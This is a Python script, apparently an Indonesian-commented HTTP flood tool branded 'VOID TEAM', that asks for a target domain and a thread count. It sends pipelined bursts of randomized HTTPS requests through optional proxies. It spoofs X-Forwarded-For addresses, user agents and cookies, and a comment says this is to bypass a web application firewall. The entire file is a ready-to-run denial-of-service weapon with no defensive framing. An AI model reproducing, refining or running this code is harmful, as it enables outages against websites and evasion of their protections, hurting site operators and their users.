import socket
import threading
import random
import os
import ssl
import time

# --- UI VOID TEAM ---
def setup_ui():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;35m")
    print("  _      _  _____  _  ______      _______  ______  _     _  _______  ______ ")
    print(" | |    | ||     || ||      \    |       ||      \| |   | ||       ||      \ ")
    print(" | |    | ||     || ||  ---  |   |       ||  ---  | |   | ||  _____||  ---  |")
    print(" | |    | ||     || || |   | |   |       || |   | | |   | || |_____ | |   | |")
    print("  \ \  / / |     || || |   | |   |      _|| |   | | |   | ||_____  || |   | |")
    print("   \ \/ /  |_____|| || |___| |   |     |_ | |___| | |___| | _____| || |___| |")
    print("    \__/   |_______||_______/    |_______||______/|_______||_______||______/ ")
    print("\n [ VERSION 5.0 - STEALTH & BRUTAL ] [ TARGET: STELLAR PLUS ] [ BY: VOID TEAM ]")
    print("\033[0m")

sent_packets = 0
lock = threading.Lock()

# Database Header untuk bypass WAF
def get_headers(domain):
    path = f"/?v={random.getrandbits(32)}&id={random.randint(1000,9999)}"
    methods = ["GET", "POST", "HEAD"]
    ua = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Linux x86_64; bash) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    ]
    
    headers = f"{random.choice(methods)} {path} HTTP/1.1\r\n" \
              f"Host: {domain}\r\n" \
              f"User-Agent: {random.choice(ua)}\r\n" \
              f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" \
              f"Accept-Language: en-US,en;q=0.5\r\n" \
              f"Accept-Encoding: gzip, deflate, br\r\n" \
              f"Referer: https://www.google.com/search?q={domain}\r\n" \
              f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n" \
              f"Cookie: _ga=GA1.1.{random.randint(1000,9999)}; sess_id={random.getrandbits(64)}\r\n" \
              f"Connection: keep-alive\r\n" \
              f"Cache-Control: max-age=0\r\n\r\n"
    return headers.encode()

def attack():
    global sent_packets
    # Load Proxy
    try:
        with open("proxy.txt", "r") as f:
            proxies = f.readlines()
    except:
        proxies = []

    while True:
        try:
            # Setup Socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            
            # Use Proxy if available
            if proxies:
                proxy = random.choice(proxies).strip().split(':')
                s.connect((proxy[0], int(proxy[1])))
                # HTTP CONNECT Tunneling
                s.sendall(f"CONNECT {domain}:443 HTTP/1.1\r\nHost: {domain}\r\n\r\n".encode())
                s.recv(1024)
            else:
                target_ip = socket.gethostbyname(domain)
                s.connect((target_ip, 443))

            # SSL Wrap dengan ciphers ringan
            ctx = ssl._create_unverified_context()
            ssls = ctx.wrap_socket(s, server_hostname=domain)
            
            # Kirim bertubi-tubi (Pipelining)
            payload = get_headers(domain)
            for _ in range(150): # Peningkatan intensitas per socket
                ssls.sendall(payload)
                with lock:
                    sent_packets += 1
            
            ssls.close()
        except:
            try: s.close()
            except: pass

def monitor():
    while True:
        with lock:
            print(f"\r\033[1;32m [+][VOID] Paket Tembus: {sent_packets} | Target: {domain} | Mode: SSL-STEALTH\033[0m", end="")
        time.sleep(0.1)

# --- EXECUTION ---
setup_ui()
domain = input("\033[1;36m [?] Domain Target (pastigacorbos.site): \033[0m").replace("https://", "").replace("http://", "").split('/')[0]
threads = int(input("\033[1;36m [?] Threads (Rekomendasi 1000+): \033[0m"))

threading.Thread(target=monitor, daemon=True).start()

for i in range(threads):
    threading.Thread(target=attack).start()
